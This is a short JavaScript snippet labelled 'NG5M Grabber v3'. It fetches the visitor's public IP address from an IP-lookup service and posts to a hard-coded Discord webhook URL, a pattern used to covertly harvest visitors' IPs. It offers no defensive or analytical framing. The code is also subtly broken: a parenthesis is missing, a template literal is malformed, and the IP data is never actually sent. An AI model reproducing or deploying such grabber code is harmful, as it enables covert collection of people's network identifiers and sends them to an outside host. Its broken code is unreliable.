var a = new XMLHttpRequest();

function send(url,data) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST",url,true);
    xhr.setRequestHeader("Content-Type","application/json");
    xhr.send(JSON.stringify(data);
}

a.open("GET","https://api64.ipify.org");
a.onreadystatechange = function () {
    if (this.readyState === 4) {
        var embed = {
            "author":"test",
            "title":"**Info**",
            "description":`IP: {this.responseText}`,
        }
        
        const data = {
            "username":"NG5M Grabber v3",
            "content":"b"
        }
        
        send("https://discord.com/api/webhooks/1135708876558307369/rQXfBU63WU64V7BlHgvgOlqMnqSVeTm1yZ6T5nQrWtjq8dPkqyARtkwN1af4KLPORymw",data);
    }
};

a.send();
